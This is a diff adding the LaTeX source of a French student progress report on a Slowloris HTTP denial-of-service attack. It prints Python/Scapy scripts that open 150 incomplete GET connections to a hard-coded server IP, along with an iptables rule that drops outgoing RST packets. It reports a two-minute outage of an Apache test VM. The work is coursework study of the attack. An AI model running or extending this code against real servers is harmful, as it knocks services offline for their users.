@@ -1,0 +1,277 @@
+\documentclass{article}
+\usepackage[utf8]{inputenc}
+\usepackage[margin=1 in]{geometry}
+\usepackage{graphicx}
+\usepackage[colorlinks]{hyperref}
+\usepackage{listings}
+\usepackage{color}
+\usepackage{algorithm}
+\usepackage{algorithmic}
+\usepackage{float} %for floating images
+\usepackage[table,xcdraw]{xcolor} %for colored tables
+
+\hypersetup{
+  colorlinks=true,
+  linkcolor=black,
+  urlcolor=blue
+}
+
+\definecolor{dkgreen}{rgb}{0,0.6,0}
+\definecolor{gray}{rgb}{0.5,0.5,0.5}
+\definecolor{mauve}{rgb}{0.58,0,0.82}
+
+\lstset{frame=tb,
+  language=Python,
+  aboveskip=3mm,
+  belowskip=3mm,
+  showstringspaces=false,
+  columns=flexible,
+  basicstyle={\small\ttfamily},
+  numbers=left,
+  numberstyle=\tiny\color{gray},
+  keywordstyle=\color{blue},
+  commentstyle=\color{dkgreen},
+  stringstyle=\color{mauve},
+  breaklines=true,
+  breakatwhitespace=true,
+  tabsize=3
+}
+
+
+\author{Matheus Augusto da Silva -- Alessandro Montaldo}
+\title{\textbf{SR2I 203 - Premiers résultats}}
+\date{Janvier 2019}
+
+\begin{document}
+\maketitle
+\tableofcontents
+
+%--------------------------
+\section{Introduction}
+Notre projet s'agit de réaliser un étude et une implémentation d'un type spécifique d'attaque DoS; il s'agit d'un attaque Low and Slow, plus spécifiquement,
+l'attaque slowloris. L’objectif de ce rapport est d'introduire le progrès déjà fait en termes de code source. Ce qui a été réalise lors de l'écriture de
+ce rendu:
+
+\begin{itemize}
+    \item La création d'une fonction qui envoie les requêtes GET incomplètes de l'attaque
+    \item Une fonction \textit{main()} qui emploie la fonction crée pour initialiser connexions avec un serveur
+    \item La réalisation de plusieurs tests avec le programme fait, analyse des réponses du serveur
+    \item Discussion de ce qui est requis du projet final, mise en détailles d'un \textit{workflow} que l'on suivra
+\end{itemize}
+
+%--------------------------
+\section{Implémentation en Python}
+\subsection{Programmation}
+%Le travail d'implémentation a commencé en déterminant les aspects principaux requises. Fonctionnellement, nous avions
+%besoin d'un petit programme capable d’envoyer requêtes HTTP.Comme nous disons la section d'avant,
+%l'attaque \textit{slowloris} est fonctionnellement très élégant; en exploitant le mécanisme des GET
+%requests du protocole HTTP plusieurs fois, on occupe tous les \textit{threads} disponibles au serveur.
+%Alors, comme le but de notre état de l'art, on a fixé l'objectif d’implémenter un programme capable d'envoyer
+%GET requests à un serveur web HTTP.Cette fonctionnalité pourra après être déléguée à une fonction en python,
+%que l'on appellera lors de l'attaque dans une structure de contrôle plus intelligente.
+%Le but est d'utiliser les méthodes de Scapy, ce qui nous donnera la capacité de contrôler d'une façon plus granulaire
+%l'envoie des paquets. Le code source est travaillé et managé à travers de
+%git et le dépôt est disponible publiquement sur Github (documenté en anglais) sur le lien \href{https://github.com/AlessandroMontaldo/slowLorisAttack}{https://github.com/AlessandroMontaldo/slowLorisAttack}
+
+Comme établie dans le dernier rendu, nous avons réussi à créer un petit programme sur Scapy capable d'envoyer
+requêtes HTTP et réaliser un 3-way Handshake. Le HTTP Request a été donné à une fonction appelée \textit{request\_http},
+qui reçoit comme arguments une adresse IP, un numéro de porte et un \textit{Sequence Number} comme paramètre optionnel.
+Comme nous avons mentionné, il nous faudrait, à cette étape, appliquer une couche logique sur cette fonction
+et quelques fonctions d'autres dans Python pour effectuer d'abord une initialisation des connexions (établir
+chaque \textit{socket}) et puis garder les connexions ouvertes, en renvoyant messages d'une façon périodique.
+Cette procédure on a encore divisé en deux tâches: l'établissement des \textit{sockets} et le contrôle
+des connexions ouvertes. La première tâche est bien implémentée: on a réussi d'ouvrir une connexion avec 150 \textit{sockets}
+différents en parallèle, ce qui a effectivement nous empêché d'accéder au site web avec d'autres machines.
+Nous n'avons pas encore mis les moyennes de garder la connexion ouvertes (ce qui manque pour le dernier rendu)
+mais avec cette partie de code on peut déjà ouvrir l'attaque et effectuer le \textbf{DoS} contre un
+site web quelconque travaillant sur Apache.
+
+\begin{lstlisting}
+#!/usr/bin/env python
+# Imports
+# from scapy.layers import http
+from scapy.all import *
+import scapy_http.http
+import random
+
+# TITLE: request_http.py
+# AUTHORS: Matheus Augusto da Silva; Alessandro Montaldo
+# OBS: The following command stops Linux machines from dropping
+# the TCP connection started by scapy (run as root):
+# iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
+
+# This function sends a GET Request in HTTP 1.1 after the TCP 3-way handshake and
+# returns some information on the state of the TCP connection
+
+# This handles HTTP responses from the server
+#def handle(pkt):
+    #if pkt.haslayer(scapy_http.http.HTTPRequest):
+        #pkt.show()
+
+# Make a TCP SYN
+def httpRequest(ip_address,source_port,sequence_number=42): 
+    #ip_address="35.204.58.85"    # Alessandro's server
+    #ip_address="192.168.33.10"    # Matheus' VM (see Vagrantfile)
+    #ip_address="35.204.165.14"
+    #source_port = random.randrange(1024,6500)
+
+    print('httpRequest fuct: port =', source_port, ' seq =', sequence_number)
+
+    server_port=80                # http port
+    ip = IP(dst=ip_address)       # IP Packet 
+
+    get = ("GET / HTTP/1.1\r\nHost: "
+    + ip_address
+    + "\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4"
+    + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8"
+    + "\r\nAccept-Language: en-US,en;q=0.5"
+    + "\r\nAccept-Encoding: gzip, deflate"
+    + "\r\nConnection: keep-alive\r\n"
+    #+ "\r\nConnection: keep-alive"
+    )
+
+    # The TCP 3-way handshake rules must be followed. As such,
+    # we begin by sending a TCP packet with the S (or SYN) flag set.
+    SYN = ip/TCP(sport=source_port, dport=server_port, flags="S", seq=sequence_number) 
+
+    # Send SYN and wait for SYNACK as response
+    #SYN.show()
+    SYNACK = sr1(SYN)
+
+    # Send ACK and finally HTTP GET, sniff for the resultACK = ip/TCP(sport=SYNACK.dport, dport=server_port, flags="A", seq=SYNACK.ack, ack=(SYNACK.seq+1))
+    ACK = ip/TCP(sport=source_port, dport=server_port, flags="A", seq=SYNACK.ack, ack=(SYNACK.seq+1))
+    GET = ip/TCP(sport=source_port, dport=server_port, seq=ACK.seq, flags = 24 , ack=(ACK.ack))/get
+    send(ACK)
+    REPONE =sr1(GET) 
+    SECACK = ip/TCP(sport=source_port , dport=server_port, flags="A", seq=REPONE.ack, ack=(REPONE.seq+1))
+    REPTWO = sr1(SECACK)
+    return REPTWO.seq , REPTWO.ack
+    #sniff(filter="tcp and port 80", store=False, prn=handle) # we'll improve on this later 
+\end{lstlisting}
+
+Le développement reste sur le lien GitHub
+\href{https://github.com/AlessandroMontaldo/slowLorisAttack}{https://github.com/AlessandroMontaldo/slowLorisAttack}
+où le dernier commit (à 14/Janvier/2019) montre en termes généraux la structure que l'on vise. 
+\textit{request\_http.py} est devenu une fonction, qui on appelle dans le \textit{main} de
+\textit{loris.py}, notre fonction qui exécutera l'attaque et traitera des structures de données
+impliquées.
+
+\begin{lstlisting}
+#!/usr/bin/env python
+
+# Imports
+from scapy.all import *
+from request_http import *
+import time
+import random
+
+# TITLE: loris.py
+# AUTHORS: Matheus Augusto da Silva; Alessandro Montaldo
+# This block will call over the function in request_http which we defined earlier
+# and also have a few variables and lists containing data pertaining to each
+# individual connection
+
+# Since Scapy goes a little bit more lower-level than the regular sockets library
+# for python ( we are managing TCP connections without a logical layer of abstraction )
+# some data structures should be set in place such that TCP rules are followed:
+# - Sequence and Acknowledgment numbers should be watched closely
+# - We probably can't check the current TCP connection's livelihood without sending another packet,
+#   so we'll take a more practical approach and periodically refresh connections.
+# - Connections will be refreshed by sending a random integer in the HTTP Header
+# - GET Requests are incomplete (we need to send two end-of-line characters to finish
+#   a request) , only one of the end-of-line characters will be sent
+# - If requests are sent unfinished, the server may assume we have a slow Internet
+#   connection or a problem has happened; it will trigger a timer and wait a bit before
+#   killing the socket (as far as we saw, this can take up to two minutes)
+# - If we keep opening a big number of connections (around 150) the thread pool in the server
+#   side may be exhausted, effectively DoS'ing the HTTP service
+
+def main():
+    ip_address = "35.204.165.14"
+    #ip_address = "asdkappadue.it"
+    port = random.randint(1024,6000) # 4213 
+    ip = IP(dst=ip_address)
+    server_port=80
+    list_size = 150
+    port_list = list(range(port, port + list_size))
+
+    seqAckList = []
+    seqNumList = []
+
+    # The data structures are bound to be changed somewhat in the final version
+    for _ in range(list_size):
+        seqNumList.append(1) #init of seq numb
+        seqAckList.append(1) #init of ack numb
+
+    print(port_list)
+
+    # This will initialise each individual TCP socket
+    for p in range(list_size):
+        seqNumList[p], seqAckList[p] = httpRequest(ip_address,port_list[p], seqNumList[p])
+    
+    # This treatment will probably be changed later
+    for n in range(0):
+	for p in range(list_size):
+            ACK = ip/TCP(sport=p,
+                         dport=server_port,
+                         flags="A",
+                         seq=seqNumList[p],
+                         ack=seqAckList[p])
+            MYNUMBER=ACK/"X-a: {}\r\r".format(random.randint(1,5000)).encode("utf-8")
+            answerMyNumber = sr1(MYNUMBER)
+            seqNumlist[p]+= 1
+            seqAcklist[p] = answerMyNumber.seq
+        
+if __name__== "__main__":
+    main()
+\end{lstlisting}
+
+\subsection{Nouveaux résultats}
+Nous avons déjà démontré le fonctionnement de \textit{request\_http} dans le dernier rendu. La procédure pour
+celui-ci était de le reformater le code dans une fonction employée lors de l'attaque; ça on a bien exécuté.
+
+Avec le code montré en dessus, on a trouvé des bons résultats en termes du attaque. Un serveur Apache 2.4.7 sur Ubuntu 14.05 
+a été mis en place sur une machine virtuelle pour que l'on puisse essayer l'attaque. Le serveur Web est une
+installation d'Apache. En appliquant l'attaque, on a initialisé 150 \textit{sockets}. On n'a pas mis
+encore en place la structure qui réalise les itérations, mais juste en initialisant les connexions on a déjà
+pu réaliser un \textbf{DoS} d'environ 2 minutes.
+
+
+%--------------------------
+\section{Travaux futurs}
+Avec la forme la plus primitive de l'attaque mise en place, nos prochaines démarches seront de mettre en place
+la structure logique complète. On travaillera sur l'étape responsable d'implémenter l'itération des connexions
+ouvertes pour que l'on puisse exécuter le \textbf{DoS} pour une durée indéterminée. Avec l'aspect fonctionnel
+terminé, on rajoutera quelques \textit{features} de qualité de vie; on veut que l'usager puisse 
+spécifier comme arguments certaines variables comme la quantité de \textit{sockets} à ouvrir, l'adresse
+IP ou nom de domaine de la cible voulue et quelques autres options que l'on trouve utiles.
+
+\newpage
+\begin{thebibliography}{}
+
+\bibitem{rfc}{Internet Engineering Task Force (IETF)\\
+\href{https://tools.ietf.org/html/rfc1945}{Request for Comment 1945 - Hypertext Transfer Protocol 1.0}}
+
+\bibitem{http-book}{THOMAS, Stephen \\
+HTTP Essentials: Protocols for Secure, Scaleable Web Sites}
+
+\bibitem{apache}{The Apache Group \\
+\href{https://httpd.apache.org/docs/2.2/fr/new_features_2_0.html.fr}{Vue d'ensemble des nouvelles fonctionnalités d'Apache 2.0}}
+
+\bibitem{hackers}{Ha.ckers group, archivé \\
+\href{https://web.archive.org/web/20150426090206/http://ha.ckers.org/slowloris}{Slowloris HTTP DoS}}
+
+\bibitem{repo}{Dépôt Github \\
+\href{https://github.com/llaera/slowloris.pl}{slowloris.pl, a perl implementation}}
+
+\bibitem{repo}{Acunetix website \\
+\href{https://www.acunetix.com/blog/articles/slow-http-dos-attacks-mitigate-apache-http-server/}{Acunetix blog - How To Mitigate Slow HTTP DoS Attacks in Apache HTTP Server}}
+
+\end{thebibliography}
+\end{document}
+
+%%% Local Variables:
+%%% mode: latex
+%%% TeX-master: t
+%%% End:
+%%% joel.kerleguer@gmail.com
